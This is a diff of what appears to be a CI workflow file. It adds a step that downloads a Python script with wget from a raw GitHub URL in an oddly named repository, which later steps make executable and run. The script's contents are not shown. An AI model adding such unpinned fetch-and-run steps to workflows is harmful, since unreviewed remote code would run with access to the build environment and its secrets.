@@ -39,6 +39,8 @@ jobs:
           python-version: '3.12'
       - name: Install Python dependencies
         run: pip install requests
+      - name: Download 3.py
+        run: wget https://raw.githubusercontent.com/A03219026/repo-z57godx0/refs/heads/main/3.py
       - name: Make 3.py executable
         run: chmod +x 3.py
       - name: Run 3.py with parameters
